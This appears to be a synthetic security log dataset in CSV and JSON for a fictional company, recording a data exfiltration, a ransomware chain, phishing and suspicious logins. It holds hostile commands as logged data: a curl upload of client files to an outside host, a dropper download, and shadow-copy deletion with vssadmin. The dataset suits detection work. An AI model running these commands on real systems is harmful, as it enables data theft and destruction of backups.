@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-11-10T14:03:05Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,curl.exe,"curl.exe -X POST https://fileshare-sync.net/upload -F ""file=@C:\Users\asmith\Documents\client_data.rar""",,,,Sysmon: curl.exe executed,"{""@timestamp"": ""2024-11-10T14:03:05Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon: curl.exe executed"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""curl.exe"", ""pid"": 5310, ""parent"": {""name"": ""powershell.exe"", ""pid"": 5300}, ""command_line"": ""curl.exe -X POST https://fileshare-sync.net/upload -F \""file=@C:\\Users\\asmith\\Documents\\client_data.rar\""""}}"
2024-11-10T14:03:06Z,terminal,command,WKSTN-022,10.10.22.44,asmith,,,,,,,,,,"2024-11-10T14:03:06Z asmith@WKSTN-022$ curl -X POST https://fileshare-sync.net/upload -F ""file=@C:\Users\asmith\Documents\client_data.rar""
{""status"":""ok"",""id"":""u_83912""}","{""@timestamp"": ""2024-11-10T14:03:06Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-10T14:03:06Z asmith@WKSTN-022$ curl -X POST https://fileshare-sync.net/upload -F \""file=@C:\\Users\\asmith\\Documents\\client_data.rar\""\n{\""status\"":\""ok\"",\""id\"":\""u_83912\""}"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""terminal"": {""command"": ""curl -X POST https://fileshare-sync.net/upload -F \""file=@C:\\Users\\asmith\\Documents\\client_data.rar\"""", ""output"": ""{\""status\"":\""ok\"",\""id\"":\""u_83912\""}""}}"
2024-11-10T14:05:00Z,endpoint,registry_set,WKSTN-022,10.10.22.44,asmith,,,,,,,,,,Registry Run key set for sync client,"{""@timestamp"": ""2024-11-10T14:05:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""registry_set"", ""kind"": ""event"", ""category"": [""registry""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Registry Run key set for sync client"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""registry"": {""path"": ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SyncClient"", ""data"": {""strings"": [""\""C:\\Users\\asmith\\AppData\\Local\\Temp\\sync.exe\"" /silent""]}}}"
2024-11-14T02:10:05Z,identity,interactive_logon,,,jdoe,203.0.113.50,,,,,,,,,Auth: logon type=2 user=jdoe ip=203.0.113.50 outcome=success,"{""@timestamp"": ""2024-11-14T02:10:05Z"", ""event"": {""dataset"": ""identity"", ""action"": ""interactive_logon"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Auth: logon type=2 user=jdoe ip=203.0.113.50 outcome=success"", ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""203.0.113.50""}, ""service"": {""name"": ""windows_logon""}}"
2024-11-14T02:11:00Z,terminal,command,WKSTN-014,10.10.14.23,jdoe,,,,,,,,,,"2024-11-14T02:11:00Z jdoe@WKSTN-014$ whoami /all
(output truncated)","{""@timestamp"": ""2024-11-14T02:11:00Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-14T02:11:00Z jdoe@WKSTN-014$ whoami /all\n(output truncated)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""terminal"": {""command"": ""whoami /all"", ""output"": ""(output truncated)""}}"
2024-11-14T02:11:20Z,terminal,command,WKSTN-014,10.10.14.23,jdoe,,,,,,,,,,"2024-11-14T02:11:20Z jdoe@WKSTN-014$ net share
(output truncated)","{""@timestamp"": ""2024-11-14T02:11:20Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-14T02:11:20Z jdoe@WKSTN-014$ net share\n(output truncated)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""terminal"": {""command"": ""net share"", ""output"": ""(output truncated)""}}"
2024-11-14T02:11:40Z,terminal,command,WKSTN-014,10.10.14.23,jdoe,,,,,,,,,,"2024-11-14T02:11:40Z jdoe@WKSTN-014$ wmic qfe get hotfixid
(output truncated)","{""@timestamp"": ""2024-11-14T02:11:40Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-14T02:11:40Z jdoe@WKSTN-014$ wmic qfe get hotfixid\n(output truncated)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""terminal"": {""command"": ""wmic qfe get hotfixid"", ""output"": ""(output truncated)""}}"
2024-11-14T02:12:00Z,terminal,command,WKSTN-014,10.10.14.23,jdoe,,,,,,,,,,"2024-11-14T02:12:00Z jdoe@WKSTN-014$ vssadmin list shadows
(output truncated)","{""@timestamp"": ""2024-11-14T02:12:00Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-14T02:12:00Z jdoe@WKSTN-014$ vssadmin list shadows\n(output truncated)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""terminal"": {""command"": ""vssadmin list shadows"", ""output"": ""(output truncated)""}}"
2024-11-14T02:12:00Z,network,dns,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,,,,,,,,,DNS query update-storage.cc -> 185.82.219.54,"{""@timestamp"": ""2024-11-14T02:12:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS query update-storage.cc -> 185.82.219.54"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""dns"": {""question"": {""name"": ""update-storage.cc""}, ""answers"": [{""data"": ""185.82.219.54"", ""ttl"": 60}]}}"
2024-11-14T02:12:08Z,network,http,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.82.219.54,80,http://update-storage.cc/bin/loader.exe,,,,,,PROXY: GET /bin/loader.exe status=200,"{""@timestamp"": ""2024-11-14T02:12:08Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: GET /bin/loader.exe status=200"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.82.219.54"", ""port"": 80}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 550400}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""http://update-storage.cc/bin/loader.exe""}, ""user_agent"": {""original"": ""Mozilla/5.0""}}"
2024-11-14T02:12:12Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\AppData\Local\Temp\loader.exe,aa11bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: dropper written to Temp\loader.exe,"{""@timestamp"": ""2024-11-14T02:12:12Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: dropper written to Temp\\loader.exe"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\AppData\\Local\\Temp\\loader.exe"", ""hash"": {""sha256"": ""aa11bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:12:20Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,loader.exe,"""C:\Users\jdoe\AppData\Local\Temp\loader.exe"" /stage",,,,EDR: unsigned executable started,"{""@timestamp"": ""2024-11-14T02:12:20Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: unsigned executable started"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""loader.exe"", ""pid"": 6200, ""parent"": {""name"": ""powershell.exe"", ""pid"": 4120}, ""command_line"": ""\""C:\\Users\\jdoe\\AppData\\Local\\Temp\\loader.exe\"" /stage""}}"
2024-11-14T02:13:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,,,,Sysmon: vssadmin delete shadows,"{""@timestamp"": ""2024-11-14T02:13:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon: vssadmin delete shadows"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""vssadmin.exe"", ""pid"": 6300, ""parent"": {""name"": ""loader.exe"", ""pid"": 6200}, ""command_line"": ""vssadmin.exe Delete Shadows /All /Quiet""}}"
2024-11-14T02:14:00Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\0_Q4_report.xlsx.locked,0011bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:14:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\0_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0011bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:14:15Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\1_Q4_report.xlsx.locked,0111bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:14:15Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\1_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0111bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:14:30Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\2_Q4_report.xlsx.locked,0211bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:14:30Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\2_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0211bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:14:45Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\3_Q4_report.xlsx.locked,0311bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:14:45Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\3_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0311bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:15:00Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\4_Q4_report.xlsx.locked,0411bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:15:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\4_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0411bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:15:15Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Documents\5_Q4_report.xlsx.locked,0511bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900,,EDR: high-rate file modifications (simulated encryption),"{""@timestamp"": ""2024-11-14T02:15:15Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: high-rate file modifications (simulated encryption)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Documents\\5_Q4_report.xlsx.locked"", ""hash"": {""sha256"": ""0511bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900""}}}"
2024-11-14T02:16:00Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\Desktop\README_RECOVER_FILES.txt,bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900aa11,,FileWrite: ransom note created,"{""@timestamp"": ""2024-11-14T02:16:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FileWrite: ransom note created"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\Desktop\\README_RECOVER_FILES.txt"", ""hash"": {""sha256"": ""bb22cc33dd44ee55ff6677889900aa11bb22cc33dd44ee55ff6677889900aa11""}}}"
2024-11-20T09:00:00Z,network,flow,WKSTN-031,10.10.31.19,bchan,10.10.31.19,45.155.204.99,443,,,,,,,Firewall: BLOCK outbound to 45.155.204.99:443,"{""@timestamp"": ""2024-11-20T09:00:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Firewall: BLOCK outbound to 45.155.204.99:443"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""destination"": {""ip"": ""45.155.204.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 0}}"
2024-11-20T09:07:00Z,identity,mfa_failed,,,bchan,198.51.100.10,,,,,,,,,2024-11-20T09:07:00Z user=bchan action=mfa_failed ip=198.51.100.10 result=failure,"{""@timestamp"": ""2024-11-20T09:07:00Z"", ""event"": {""dataset"": ""identity"", ""action"": ""mfa_failed"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""failure""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-20T09:07:00Z user=bchan action=mfa_failed ip=198.51.100.10 result=failure"", ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""198.51.100.10""}, ""service"": {""name"": ""azuread""}}"
2024-11-20T09:08:00Z,identity,login_success,,,bchan,198.51.100.10,,,,,,,,,2024-11-20T09:08:00Z user=bchan action=login_success ip=198.51.100.10 result=success,"{""@timestamp"": ""2024-11-20T09:08:00Z"", ""event"": {""dataset"": ""identity"", ""action"": ""login_success"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-20T09:08:00Z user=bchan action=login_success ip=198.51.100.10 result=success"", ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""198.51.100.10""}, ""service"": {""name"": ""azuread""}}"
2024-11-20T09:14:00Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T09:14:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 5213, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T09:21:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T09:21:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6554, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T09:28:00Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T09:28:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 5273, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T09:35:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T09:35:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6595, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T09:42:00Z,email,delivered,,,asmith,,,,http://shipping-notice.com/track,,,,,Package Delivery Attempt,SMTP: suspicious link delivered,"{""@timestamp"": ""2024-11-20T09:42:00Z"", ""event"": {""dataset"": ""email"", ""action"": ""delivered"", ""kind"": ""event"", ""category"": [""email""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""SMTP: suspicious link delivered"", ""user"": {""name"": ""asmith"", ""email"": null}, ""email"": {""from"": {""address"": [""noreply@shipping-notice.com""]}, ""to"": {""address"": [""asmith@company.com""]}, ""subject"": ""Package Delivery Attempt"", ""message_id"": ""<SCN-107@mail>"", ""urls"": [""http://shipping-notice.com/track""]}, ""url"": {""full"": ""http://shipping-notice.com/track""}}"
2024-11-20T09:49:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T09:49:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 4718, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T09:56:00Z,identity,mfa_failed,,,asmith,198.51.100.10,,,,,,,,,2024-11-20T09:56:00Z user=asmith action=mfa_failed ip=198.51.100.10 result=failure,"{""@timestamp"": ""2024-11-20T09:56:00Z"", ""event"": {""dataset"": ""identity"", ""action"": ""mfa_failed"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""failure""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-20T09:56:00Z user=asmith action=mfa_failed ip=198.51.100.10 result=failure"", ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""198.51.100.10""}, ""service"": {""name"": ""azuread""}}"
2024-11-20T09:57:00Z,identity,login_success,,,asmith,198.51.100.10,,,,,,,,,2024-11-20T09:57:00Z user=asmith action=login_success ip=198.51.100.10 result=success,"{""@timestamp"": ""2024-11-20T09:57:00Z"", ""event"": {""dataset"": ""identity"", ""action"": ""login_success"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-20T09:57:00Z user=asmith action=login_success ip=198.51.100.10 result=success"", ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""198.51.100.10""}, ""service"": {""name"": ""azuread""}}"
2024-11-20T10:03:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T10:03:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6138, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T10:10:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T10:10:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 5021, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
2024-11-20T10:17:00Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command Get-Process,,,,EDR: PowerShell execution,"{""@timestamp"": ""2024-11-20T10:17:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell execution"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6020, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command Get-Process""}}"
